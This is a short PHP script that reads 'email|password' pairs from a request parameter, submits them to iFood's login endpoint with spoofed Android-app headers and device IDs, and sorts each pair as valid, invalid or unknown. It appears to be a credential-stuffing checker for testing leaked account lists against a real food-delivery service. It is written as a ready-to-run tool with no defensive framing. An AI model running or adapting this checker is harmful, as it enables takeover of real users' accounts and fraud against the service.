<?php
error_reporting(0);
set_time_limit(0);
list($email, $senha) = explode("|", $_REQUEST['linha']);
$Th = curl_init('https://marketplace.ifood.com.br/identity-providers/IFOOD/authentications');
curl_setopt($Th, CURLOPT_RETURNTRANSFER, true);
curl_setopt($Th, CURLOPT_HTTPHEADER, array('X-Ifood-Session-Id: fbea22ae-d343-4531-9055-30519eb8c92d','X-Ifood-Cloud-Id: 0a284bdc-3f84-4fbc-9755-9c1fe6df9496','X-Ifood-Device-Id: a14793cac746e7ba','Content-Type: application/json; charset=utf-8','Host: marketplace.ifood.com.br
Connection: Keep-Alive','Accept-Encoding: ','User-Agent: okhttp/3.10.0'));
curl_setopt($Th, CURLOPT_POSTFIELDS, '{"email":"'.$email.'","password":"'.$senha.'","device_id":"a14793cac746e7ba","tenant_id":"IFO","identity_provider":"IFOOD"}');
$dados = curl_exec($Th);
if(strpos($dados,'"User is unauthorized"')){
	echo json_encode(array('status'=>0,'str'=>$_REQUEST['linha'],'nsaldo'=>0));
}elseif(strpos($dados,'"authenticated":true')){
	echo json_encode(array('status'=>1,'str'=>$_REQUEST['linha'],'nsaldo'=>0));
}else{
	echo json_encode(array('status'=>2,'str'=>$_REQUEST['linha'],'nsaldo'=>0));
}